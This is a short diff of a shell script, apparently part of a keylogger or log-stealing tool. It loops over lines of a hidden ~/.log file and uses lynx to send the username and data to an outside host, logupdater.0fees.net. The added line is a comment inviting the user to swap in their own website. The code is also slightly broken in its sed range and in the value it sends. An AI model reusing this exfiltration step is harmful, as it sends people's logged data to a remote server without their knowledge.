@@ -7,6 +7,7 @@ i=`cat .log_line`
 j=`cat ~/.log|wc -l`
 for string in `sed -n "$i,$jp" ~/.log`
 do
+#change the below line to suite your website
 lynx http://logupdater.0fees.net?user=`whoami`&data=$i
 killall lynx
 done
